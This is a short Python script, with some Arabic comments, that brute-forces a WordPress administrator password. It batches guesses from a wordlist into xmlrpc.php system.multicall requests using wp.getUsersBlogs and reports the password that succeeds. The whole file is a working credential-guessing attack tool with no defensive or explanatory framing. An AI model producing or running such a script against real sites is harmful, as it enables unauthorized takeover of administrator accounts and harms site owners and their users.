import xmlrpc.client
from colorama import Fore, init

u = "\033[1;34m"
t = "\033[1;35m"
s = "\033[1;36m"
q = "\033[1;31m"
z = "\033[1;33m"

init(autoreset=True)

url = "https://www.example.com/xmlrpc.php"
username = "admin"
passwords_file = "passwords.txt" #قائمة كلمات المرور ::::::
batch_size = 4

with open(passwords_file, 'r', encoding='utf-8') as f:
    passwords = [line.strip() for line in f if line.strip()]

client = xmlrpc.client.ServerProxy(url)
found = False
batch_count = 0



for i in range(0, len(passwords), batch_size):
    batch = passwords[i:i+batch_size]
    multicall_data = []

    for pw in batch:
        multicall_data.append({
            'methodName': 'wp.getUsersBlogs',
            'params': [username, pw]
        })

    try:
        print(f"{u}[●] Group number(دفعت الباسويرد) {batch_count + 1}~~~")
        response = client.system.multicall(multicall_data)

        for pw, res in zip(batch, response):
            if isinstance(res, list):
                print(Fore.GREEN + f"[✅️] {pw}")
                found = True
                break
            else:
                print(Fore.YELLOW + f"{q}[❌️]{z} {pw}{q} | {t}Server-response: {s} {res.get('faultString')}")

        if found:
            break

    except Exception as e:
        print(Fore.RED + f"[!] Error sending group: {e}")

    batch_count += 1

if not found:
    print(Fore.RED + "[×]The-password-is-incorrect")
